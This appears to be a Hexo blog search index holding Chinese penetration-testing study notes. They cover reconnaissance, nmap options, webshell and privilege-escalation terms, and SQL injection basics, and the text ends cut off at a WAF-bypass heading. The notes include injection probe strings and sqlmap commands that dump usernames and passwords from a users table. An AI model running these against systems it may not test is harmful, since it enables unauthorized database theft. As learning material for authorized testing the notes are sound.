<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透测试</title>
    <link href="/2024/07/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2024/07/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="1-渗透测试"><a href="#1-渗透测试" class="headerlink" title="1.渗透测试"></a>1.渗透测试</h1><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="①流程"><a href="#①流程" class="headerlink" title="①流程"></a>①流程</h3><blockquote><p>前期交互</p><p>信息收集</p><p>威胁建模</p><p>漏洞分析</p><p>渗透攻击</p><p>后渗透攻击</p><p>报告</p></blockquote><h3 id="②测试方法"><a href="#②测试方法" class="headerlink" title="②测试方法"></a>②测试方法</h3><blockquote><p>白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。</p><p>黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。</p></blockquote><h2 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h2><p>目标：</p><ul><li>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</li><li>确定规则：能渗透到什么程度，所需要的时间，能够执行修改上传，能否提权等。</li><li>确定需求：web应用的漏洞，业务逻辑漏洞，人员权限管理漏洞等。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要收集服务器的配置信息和网站的敏感信息，其中包括：</p><ul><li>域名以及子域名信息</li><li>目标网站系统</li><li>cms指纹</li><li>目标网站真实IP</li><li>开放的端口等。</li></ul><p>信息收集的方式可分为<code>主动</code>和<code>被动</code>两种。</p><p><code>主动信息收集</code>：与目标主机进行直接交互，从而拿到目标信息。（比如黑进目标主机）</p><p><code>被动信息收集</code>：间接交互，通过搜索引擎或社会工程等方式间接获取目标主机上的信息。（比如Google搜索、Shodan搜索等）</p><h3 id="①域名信息的收集"><a href="#①域名信息的收集" class="headerlink" title="①域名信息的收集"></a>①域名信息的收集</h3><p>确定了要渗透的目标，即确定了其域名。</p><p>确定了域名之后还需要确定域名对应的<code>IP地址</code>，域名的<code>whois</code>信息、<code>子域名</code>等一系列与域名相关的信息。</p><h4 id="1、域名的whois信息"><a href="#1、域名的whois信息" class="headerlink" title="1、域名的whois信息"></a>1、域名的whois信息</h4><p><code>whois</code>是用来查询域名的<code>IP地址</code>以及所有者等信息的传输协议。</p><p>通常，执行whois查询的工具是：</p><p><a href="https://www.zhanid.com/tool/whois.html">whois查询工具—站长工具网</a></p><p><a href="https://tools.wujingquan.com/whois/">whois信息查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png" alt="image-20240707164136300"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707165721514.png" alt="image-20240707165721514"></p><p>其它的注入阿里云的域名查询在线工具也可以，就是显示出来的信息没有那么集中。</p><p>在kali下，也有默认的<code>whois工具指令</code>。</p><p>查询命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois 域名（.com）<br></code></pre></td></tr></table></figure><h4 id="2、备案信息查询"><a href="#2、备案信息查询" class="headerlink" title="2、备案信息查询"></a>2、备案信息查询</h4><p>ICP备案信息查询。</p><p>查询网址：</p><p><a href="https://icp.chinaz.com/">ICP备案查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134232544.png" alt="image-20240709134232544"></p><p><a href="https://beian.miit.gov.cn/#/Integrated/index">工信部ICP备案查询</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134434241.png" alt="image-20240709134434241"></p><p>可以从中得到一些有关于网址或者域名的一些备案号、主办单位、网站负责人之类的信息。</p><h4 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h4><p>查询子域名的几种方法如下：</p><ul><li>Layer子域名爆破机</li></ul><p>Layer是win下的一款子域名探测工具，其工作原理是：利用<code>子域名字典</code>进行爆破。</p><p>输入目标网站的域名即可启动进行字典爆破子域名。如下是访问gxu官网域名爆破得到的子域名结果。</p><p>工具地址：<code>E:\IDEToolsV2\Layer子域名挖掘机4.2纪念版</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709135535182.png" alt="image-20240709135535182"></p><ul><li>subDomainsBurte</li></ul><p>它同样也是一个子域名爆破工具，使用<code>字典暴力</code>破解，并通过<code>DNS解析</code>来确定是否存在有效的子域名。它的特点是可以用小字典递归地发现三级域名、四级域名、甚至是五级域名等不容易被探测到的域名。</p><p>工具下载链接： <a href="https://github.com/lijiejie/subDomainsBrute%EF%BC%88%E5%8F%AF%E4%BD%BF%E7%94%A8pip%E5%AE%89%E8%A3%85%EF%BC%89">https://github.com/lijiejie/subDomainsBrute（可使用pip安装）</a></p><p>也可以在kali下安装使用哦。</p><p>使用默认下载源的话可能速度较慢而且可能会失败，所以我们可以使用镜像源下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple dnspython==2.2.1 async_timeout<br></code></pre></td></tr></table></figure><p>在kali主机内部暂时下载失败。</p><p>通过远程连接下载也是失败：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142722978.png" alt="image-20240709142722978"></p><p>由错误信息可以略知一二，kali系统中本来就有<code>dnspython</code>，所以试图再次下载的时候就会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142938308.png" alt="image-20240709142938308"></p><p>所以就直接先下载那个GitHub文件。</p><p><a href="https://blog.csdn.net/m0_57206390/article/details/133201540">kali 安装使用subDomainsBrute</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git<br></code></pre></td></tr></table></figure><p>这里远程终端下载一直发生错误，在kali内部尝试访问浏览器，也不行，然后更改了代理设置为使用系统自定义的代理，但是在远程终端还是不行。去到kali本机访问目标链接，发现可以访问到，然后直接在里边下载了。成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150649237.png" alt="image-20240709150649237"></p><p>进入到目标文件夹安装依赖包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install dnspython gevent<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150903081.png" alt="image-20240709150903081"></p><p>启动方式为：进入到<code>subDomainsBrute</code>文件夹下，执行启动代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 subDomainsBrute.py gxu.edu.com（域名）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151237123.png" alt="image-20240709151237123"></p><p>爆破速度远比Layer慢。</p><ul><li>Google查询</li></ul><p>使用语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">site:域名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151514907.png" alt="image-20240709151514907"></p><p>本来也可以使用<code>FOFA</code>的，但是它并不是免费使用哈哈。</p><h4 id="4、http证书查询"><a href="#4、http证书查询" class="headerlink" title="4、http证书查询"></a>4、http证书查询</h4><p><a href="https://crt.sh/">http证书查询</a></p><p>可以输入域名，查询与其绑定的相关证书信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152136780.png" alt="image-20240709152136780"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152056475.png" alt="image-20240709152056475"></p><h4 id="5、DNS记录查询"><a href="#5、DNS记录查询" class="headerlink" title="5、DNS记录查询"></a>5、DNS记录查询</h4><p>DNS指的是域名解析服务，即将域名与IP之间做相应的转换。</p><blockquote><p>正向解析：根据域名查找对应的IP地址</p><p>反向解析：根据IP地址查找对应的域名</p></blockquote><ul><li><p>kali工具（DNSenum、Fierce、DMitry）</p></li><li><p>在线查询工具：</p><p><a href="http://tool.chinaz.com/dns/">站长工具之DNS查询</a></p><p>查询的效果是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154255324.png" alt="image-20240709154255324"></p><p><a href="https://www.virustotal.com/gui/home/search">国外的DNS查询工具</a></p><p>界面良好直观，而且经过测试应该也是免费的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154740043.png" alt="image-20240709154740043"></p></li></ul><h4 id="6、判断域名对应的IP地址"><a href="#6、判断域名对应的IP地址" class="headerlink" title="6、判断域名对应的IP地址"></a>6、判断域名对应的IP地址</h4><p>首先需要判断域名是否存在CDN的情况。可以先去在线CDN查询网站进行查询。</p><p><a href="https://ping.chinaz.com/">在线CDN查询</a></p><p>如果输入域名查询得到的IP地址不止一个的话，那就说明该IP地址不是真实的服务器地址。<code>如果是两个或者三个IP地址，并且这些IP地址是同一个地区不同运营商的话，则这些IP地址很有可能是服务器的出口地址，该服务器在内网中</code></p><p>现在下面查询的这个域名，他只有一个对应的IP地址，说明该IP地址就是该域名的真实服务器地址，不存在CDN的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709161318682.png" alt="image-20240709161318682"></p><p>如何绕过CDN查找网站的真实IP呢？</p><ul><li><p>很多时候一些重要的站点会做CDN，但是它旗下的一些子域名站点不会做CDN。可以从子域名切入查找网站的真实IP。<code>启动终端，在终端中使用ping命令。执行 ping 子域名 的命令，ping返回结果中会返回该子域名的IP地址</code>。 </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709162401797.png" alt="image-20240709162401797"></p></li></ul><blockquote><p>CDN（内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络。</p></blockquote><h3 id="②整站分析"><a href="#②整站分析" class="headerlink" title="②整站分析"></a>②整站分析</h3><p>分析的对象有：</p><ul><li><p>服务器类型：windows、linux</p><blockquote><p>ping探测：win的TLS值一般是128，linux的则一般是64。</p><p>nmap扫描：<code>namp -O/-A IP地址</code>一般都能扫描得出来。</p></blockquote></li><li><p>网站容器：apache、nginx、tomcat、IIS等</p></li><li><p>脚本类型：php、jsp、asp、aspx</p></li><li><p>数据库类型：mysql、oracle、access、sqlserver</p></li></ul><p>在之前进行靶场攻打的过程中，有关于分析网站技术构成的指纹工具（如wappalyzer）就很适合用于整站分析（网站容器、脚本类型、数据库类型）。</p><p><strong>几种数据库的区别：</strong></p><blockquote><ul><li>Access：小型数据库，数据库后缀名：.mdb。一般是asp网页文件使用这个数据库</li><li>SQL Server：比较大型的数据库，端口号为1433，数据库后缀名：.mdf</li><li>MySQL：大部分是PHP页面，默认端口号是3306</li><li>Oracle：常用于比较大型的网站，默认端口是1521</li></ul></blockquote><p>常见搭配：</p><p>asp、aspx：access、sqlserver</p><p>php：mysql、postgreSQL</p><p>jsp：Oracle、mysql</p><h3 id="③企业信息查询"><a href="#③企业信息查询" class="headerlink" title="③企业信息查询"></a>③企业信息查询</h3><p>确认了公司之后，可以去互联网上查询与该公司有关的任何信息。如：企业基本信息、员工信息（手机号、邮箱、姓名、社交账号信息等）、组织框架、企业法人、企业综合信息等。使用社会工程学攻击获取这些信息也不是不行（在合法报备情况下哈）。</p><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://www.qcc.com/">企查查</a></p><p>也可以通过之前得ICP备案查询去获取一些信息。</p><h3 id="④GitHub信息收集"><a href="#④GitHub信息收集" class="headerlink" title="④GitHub信息收集"></a>④GitHub信息收集</h3><p>亲测，做毕设的时候在GitHub上找项目，找到了一个包含一万七条的员工入职个人信息。确实有这个必要进行GitHub信息收集。</p><p>主要收集：泄露源码、泄露数据库&#x2F;邮箱&#x2F;ftp&#x2F;ssh&#x2F;3389等账号、泄露的人员信息以及其它敏感信息。</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">信息收集之Github搜索语法</a></p><h3 id="⑤端口扫描"><a href="#⑤端口扫描" class="headerlink" title="⑤端口扫描"></a>⑤端口扫描</h3><h4 id="1、nmap端口扫描"><a href="#1、nmap端口扫描" class="headerlink" title="1、nmap端口扫描"></a>1、nmap端口扫描</h4><ul><li><p>功能：主机发现（检测存活在网络上的主机）、端口发现（检测开放端口）、服务发现（检测端口开放的服务和其版本）、检测操作系统&#x2F;硬件地址&#x2F;软件版本等、检测脆弱性漏洞（<code>--script=vuln</code>）</p></li><li><p>常用命令：</p></li></ul><blockquote><p>-sS：tcp syn扫描</p><p>-p：指定端口号扫描</p><p>-v：显示扫描过程</p><p>-F：快速扫描</p><p>-A：全面扫描</p><p>-Pn：禁止ping后扫描，跳过主机发现的过程进行端口扫描</p><p>-sU：udp扫描</p><p>-sT：tcp扫描</p><p>-sV：扫描系统版本和程序版本号检测</p><p>-n：禁止反向域名解析</p><p>-R：启用反向域名解析</p><p>-6：启用IPV6扫描</p><p>–script&#x3D;vuln：全面的漏洞扫描</p></blockquote><h4 id="2、旁站和c段扫描"><a href="#2、旁站和c段扫描" class="headerlink" title="2、旁站和c段扫描"></a>2、旁站和c段扫描</h4><p>旁站是指和目标网站在同一台服务器上的其它网站。拿webshell，提权，拿下该网站。</p><p>使用IP反查域名搜索旁站：</p><p><a href="http://s.tool.chinaz.com/same">IP反查域名</a></p><p><a href="https://www.aizhan.com/">SEO综合查询·反查域名</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709230713348.png" alt="image-20240709230713348"></p><p>对红蓝对抗和护网，c段扫描比较有意义。c段是指与目标服务器IP处于同一个C段的其它服务器。（192.168.1.0&#x2F;24）</p><h3 id="⑥网站敏感目录和文件"><a href="#⑥网站敏感目录和文件" class="headerlink" title="⑥网站敏感目录和文件"></a>⑥网站敏感目录和文件</h3><p>通常我们所说的敏感文件、敏感目录大概有以下几种：</p><blockquote><p>后台、robots.txt、数据库.log、sitemap.xml、mysql.sql、licence.txt、Git、hg&#x2F;Mercurial、svn&#x2F;Subversion、bzr&#x2F;Bazaar、Cvs、WEB-INF泄露、备份文件泄露、配置文件泄露。</p></blockquote><ul><li>Cansina</li></ul><p>用于发现网站的敏感目录和内容的安全测试工具，通过分析服务器的响应进行探测并使用sqlite保证数据持久性。</p><p>下载地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p><ul><li>Githack</li></ul><p>git泄露利用脚本</p><p>下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><p>利用上一个信息收集阶段获取的信息进行攻击规划。</p><p>标识目标组织可能存在的漏洞与缺陷，根据威胁模型确定下一步需要搜集的信息和攻击方法。</p><h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><p><a href="https://github.com/Getshell/LinuxTQ">linux提权方法论</a></p><h3 id="①对象"><a href="#①对象" class="headerlink" title="①对象"></a>①对象</h3><h4 id="1、CMS"><a href="#1、CMS" class="headerlink" title="1、CMS"></a>1、CMS</h4><p>内容管理系统，用于快速统一创建网站。许多使用CMS构建的网站均存在着对应的漏洞。比如，WordPress 是著名的个人网站CMS，之前我们进行靶场的攻打的时候发现它存在着不少可以被利用来提权的漏洞。</p><blockquote><p>常见的CMS网站平台有：</p><ul><li>WordPress</li><li>HubSpot</li><li>Joomla</li><li>WooCommerce</li><li>Drupal</li><li>Wix</li><li>BigCommerce</li><li>Shopify</li><li>ghost</li><li>Magento</li><li>Textpattern</li><li>Blogger</li><li>Bitrix24</li><li>TYPO3</li></ul></blockquote><p>可以通过<code>metasploit</code>、<code>searchsploit</code>等来搜索有关特定CMS平台的漏洞并尝试进行利用。</p><h4 id="2、中间件"><a href="#2、中间件" class="headerlink" title="2、中间件"></a>2、中间件</h4><p>中间件是一种独立的系统软件或服务程序，位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯，是连接两个独立应用程序或独立系统的软件。</p><p>常见的中间件有：<code>IIS、apache、ngnix、weblogic等</code>。</p><p>中间件本身并不能用来Getshell或提权。而且其一般不是以root用户启动的。但是，在特定条件下（比如存在一些安全漏洞）可以被利用来实施攻击。</p><blockquote><p>常见的三种架构：</p><ul><li>ASP &#x3D; windows + IIS + SQL Server&#x2F;Access + ASP</li><li>J2EE &#x3D; UNIX + Tomcat + Oracle + JSP</li><li>LAMP &#x3D; Linux + Apache + MySql + php</li></ul></blockquote><h4 id="3、后门"><a href="#3、后门" class="headerlink" title="3、后门"></a>3、后门</h4><p>后门是指黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。</p><p>如何检测机器上的后门，主要是通过后门扫描工具来进行。比如，BackdoorBox、</p><p><a href="https://www.freebuf.com/articles/network/356576.html">常见系统后门技术总结与分析利用</a></p><p>一般来说，我们可以通过植入后门对目标主机进行监控。具体的就先不深入探究了。</p><h4 id="4、webshell"><a href="#4、webshell" class="headerlink" title="4、webshell"></a>4、webshell</h4><p>指网站后门。它通过web服务进行命令执行。</p><h3 id="②目标"><a href="#②目标" class="headerlink" title="②目标"></a>②目标</h3><h4 id="1、Getshell"><a href="#1、Getshell" class="headerlink" title="1、Getshell"></a>1、Getshell</h4><p>即获取目标的命令执行权限。</p><blockquote><p>shell，简单来说就是“为使用者提供操作页面”的命令解释器。</p></blockquote><h4 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h4><p>操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p><a href="https://www.cnblogs.com/sfsec/p/15163907.html">linux提权总结</a></p><h4 id="3、相关术语"><a href="#3、相关术语" class="headerlink" title="3、相关术语"></a>3、相关术语</h4><blockquote><ul><li>肉鸡：被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。</li><li>抓鸡：利用程序的漏洞，使用自动化方式获取存在漏洞的行为。</li><li>撞库：撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。</li><li>拖库：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库。</li><li>POC：全称”Proof of Concept”（ 概念验证），常指一段漏洞证明的代码。</li><li>EXP：全称”Exploit”（利用），指利用系统漏洞进行攻击的动作。</li><li>Payload：“有效载荷”，指成功exploit之后，真正在目标系统执行的代码&#x2F;指令。</li><li>ShellCode：“shell代码”，是Payload的一种，因其建立正向&#x2F;反向shell而得名。</li><li>APT攻击：Advanced Persistent Threat ，高级可持续性攻击，是指组织或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。（具有极强的隐蔽性、潜伏期长、持续性强、目标性强）。</li></ul></blockquote><h2 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h2><h3 id="①SQL注入"><a href="#①SQL注入" class="headerlink" title="①SQL注入"></a>①SQL注入</h3><blockquote><p>SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。</p></blockquote><h4 id="1、先验知识"><a href="#1、先验知识" class="headerlink" title="1、先验知识"></a>1、先验知识</h4><ul><li><h5 id="Mysql的三种注释风格："><a href="#Mysql的三种注释风格：" class="headerlink" title="Mysql的三种注释风格："></a>Mysql的三种注释风格：</h5></li></ul><blockquote><p>单行注释：<code>#</code>后面直接添加注释内容</p><p>​  <code>--</code>后面直接添加注释内容</p><p>多行注释：<code>/*中间可跨行*/</code>于中间添加注释内容</p><p>内联注释：MySql为了保持于其它数据库兼容，避免从mysql中导出的sql语句不能被其它数据库使用。它将mysql中特有的语句放在了<code>/*！content*/</code>中，这些语句在不兼容的数据库中使用时便不会被执行，而mysql自身却能识别。</p><p>在SQL注入中，内联注释常用来绕过waf。</p></blockquote><ul><li><h5 id="Union联合查询："><a href="#Union联合查询：" class="headerlink" title="Union联合查询："></a>Union联合查询：</h5></li></ul><blockquote><p>Union操作符用于拼接两个或者多select查询语句</p><p>Union中的每个查询必须拥有相同的列数</p></blockquote><ul><li><h5 id="Order-by语句："><a href="#Order-by语句：" class="headerlink" title="Order by语句："></a>Order by语句：</h5></li></ul><blockquote><p>Order by语句用于根据指定的列对结果集进行排序</p><p>默认按照升序对记录进行排序</p></blockquote><ul><li><h5 id="SQL注入中常用的Mysql语句："><a href="#SQL注入中常用的Mysql语句：" class="headerlink" title="SQL注入中常用的Mysql语句："></a>SQL注入中常用的Mysql语句：</h5></li></ul><blockquote><p>user()当前用户名</p><p>database()当前所有数据库</p><p>current_user()当前用户名（可用来查看权限）</p><p>version()数据库版本</p><p>@@datadir数据库路径</p><p>load_file()读文件操作</p><p>into outfile() &#x2F; into dumpfile()写文件操作</p></blockquote><ul><li><h5 id="sql注入读写文件的条件"><a href="#sql注入读写文件的条件" class="headerlink" title="sql注入读写文件的条件"></a>sql注入读写文件的条件</h5></li></ul><blockquote><p>数据库允许导入导出（secure_file_priv）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br></code></pre></td></tr></table></figure><p>当前用户文件操作权限（File_priv）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> File_priv from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span> and host=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><ul><li><h5 id="SQL注入漏洞的判断依据"><a href="#SQL注入漏洞的判断依据" class="headerlink" title="SQL注入漏洞的判断依据"></a>SQL注入漏洞的判断依据</h5></li></ul><blockquote><p>构建测试语句</p><p>提交请求</p><p>分析返回结果</p><p>①符合预期结果，则存在SQL注入漏洞</p><p>②不符合预期结果，则可以判断为不存在SQL注入漏洞，当然也可以再次构造测试语句进行进一步的测试。</p></blockquote><ul><li><h5 id="SQL注入漏洞的类型"><a href="#SQL注入漏洞的类型" class="headerlink" title="SQL注入漏洞的类型"></a>SQL注入漏洞的类型</h5></li></ul><blockquote><p>通常分为两种：数字型、字符型</p></blockquote><h4 id="2、SQL注入技术"><a href="#2、SQL注入技术" class="headerlink" title="2、SQL注入技术"></a>2、SQL注入技术</h4><blockquote><p>主要分为三种注入技术：</p><ul><li>基于报错注入（Error-based）</li><li>基于Union联合查询注入</li><li>基于盲注（Bind SQL injection）</li></ul></blockquote><ul><li><h5 id="基于报错注入（Error-based）"><a href="#基于报错注入（Error-based）" class="headerlink" title="基于报错注入（Error-based）"></a>基于报错注入（Error-based）</h5></li></ul><p><code>用法</code>：构造错误的SQL命令将注入信息在数据库错误信息中显示出来。</p><p><code>条件</code>：需要根据不同数据库的错误处理机制以及脚本语言错误处理机制构造。</p><p><code>注意</code>：有字节数限制，可将注入的字符串信息拆分显示。</p><p><code>特点</code>：效率高。</p><ul><li><h5 id="基于Union联合查询注入"><a href="#基于Union联合查询注入" class="headerlink" title="基于Union联合查询注入"></a>基于Union联合查询注入</h5></li></ul><p><code>用途</code>：用于合并两个或多个select语句的结果集。</p><p><code>用法</code>：<code>union select column_name(s) from table_name1</code></p><p><code>注意</code>：union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型。默认union操作符选取不同的值。(如果允许重复的值，则使用<code>union all</code>)</p><p><code>特点</code>：效率高，可一次批量查询大量数据。</p><ul><li><h5 id="基于盲注（Bind-SQL-injection）"><a href="#基于盲注（Bind-SQL-injection）" class="headerlink" title="基于盲注（Bind SQL injection）"></a>基于盲注（Bind SQL injection）</h5></li></ul><p><code>用途</code>：在无法通过显示位和错误信息获取目标数据时，根据注入语句返回的true、false的结果页面不同暴力猜解目标数据。</p><p><code>用法</code>：<code>使用条件语句，如 if 、 case when等</code></p><p><code>特点</code>：暴力猜解，速度慢，效率低。</p><h4 id="3、SQL注入实操"><a href="#3、SQL注入实操" class="headerlink" title="3、SQL注入实操"></a>3、SQL注入实操</h4><p><a href="https://www.freebuf.com/articles/web/339118.html">浅谈Sql注入总结笔记整理(超详细)</a></p><p><a href="https://www.cnblogs.com/dhan/p/18290502">SQL注入基础入门-详细</a></p><h5 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h5><blockquote><p>有个注意的点：url后面必须是可注入的参数?id&#x3D;之类的，否则url检测会有问题。</p></blockquote><ul><li><strong>单引号判断法：</strong></li></ul><p>在参数（通常为网页URL）后面加上单引号（英文），重新加载网页。</p><blockquote><p>如果页面返回错误，则表示存在SQL注入。（无论是字符型还是整型都会因为单引号个数不匹配而报错）</p><p>如果未报错，也无法断定不存在SQL注入。（可能页面对单引号设置了过滤，此时可以使用判断语句进行注入）</p></blockquote><h5 id="SQL注入类型判断"><a href="#SQL注入类型判断" class="headerlink" title="(SQL注入类型判断)"></a>(SQL注入类型判断)</h5><ul><li><strong>数字型判断</strong></li></ul><blockquote><p>‘select * from <tablename> where id &#x3D; x’</p><p>当输入的参数 x 为整型时，通常在abc.php中的这种类型可以使用经典的<code>and 1=1</code>和<code>and 1=2</code>来进行判断：</p><p>url地址中输入<code>http://xxx/abc.php?id=x and 1=1</code>，若网页页面依旧运行正常，则继续执行下一步👇</p><p>url地址中输入<code>http://xxx/abc.php?id=x and 1=2</code>，页面运行错误，则说明此SQL注入为数字型注入。（换言之，如果仍然正常说明不是数字型SQL注入）</p></blockquote><ul><li><strong>字符型注入</strong></li></ul><blockquote><p>‘select * from <tablename> where id &#x3D; x’</p><p>当输入的参数 x 为字符型时，同样可以使用<code>and &#39;1&#39;=&#39;1</code>和<code>and &#39;1&#39;=&#39;2</code>来判断：</p><p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;1</code>时，如果网页页面运行正常，则继续执行下一步👇</p><p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;2</code>时，页面运行错误，则说明此SQL注入为字符型注入。</p></blockquote><ul><li><strong>sqlmap注入判断</strong></li></ul><p>当前面三种注入判断方法都尝试过，并且显示的界面都是正常的时候。此时我们仍无法断定其不存在SQL注入，可以再使用sqlmap进行扫描测试，如果再扫不出注入口的话，那有九成把握断定其不存在SQL注入。</p><p><a href="https://www.cnblogs.com/yy-123/p/16749289.html">SQLMap入门——判断是否存在注入</a></p><p><a href="https://www.cnblogs.com/wuhongbin/p/15582981.html">sqlmap使用手册（更直白款）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测是否存在注入</span><br>sqlmap -u url<br><br><span class="hljs-comment"># 获取所有表名</span><br>sqlmap -u url --dbs<br><br><span class="hljs-comment"># 获取当前库名</span><br>sqlmap -u url --current-db<br><br><span class="hljs-comment"># 获取当前连接数据库的用户名    </span><br>sqlmap -u url --current-user<br><br><span class="hljs-comment"># 获取指定库的所有表名 -D 指定数据库</span><br>sqlmap -u url -D security --tables<br><br><span class="hljs-comment"># 获取指定库指定表的字段名 -T 指定表名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 获取指定库指定表指定字段的数据 -C 指定字段名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> -C <span class="hljs-built_in">id</span>,username,password --dump<br><br><span class="hljs-comment"># 清除缓存进行注入 (删除sqlmap的output文件夹也可清除缓存)</span><br>sqlmap -u url --purge<br></code></pre></td></tr></table></figure><h4 id="4、绕过安全狗（防SQL注入功能）"><a href="#4、绕过安全狗（防SQL注入功能）" class="headerlink" 